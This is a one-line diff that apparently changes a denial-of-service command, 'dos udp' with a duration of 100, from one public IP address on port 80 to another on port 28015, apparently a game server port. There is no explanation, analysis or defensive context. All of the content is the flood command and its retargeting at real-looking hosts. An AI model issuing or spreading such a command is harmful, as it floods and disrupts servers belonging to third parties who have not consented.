@@ -1,1 +1,1 @@
-$ dos udp ip 167.114.158.78 port 80 time 100
+$ dos udp ip 147.135.205.17 port 28015 time 100
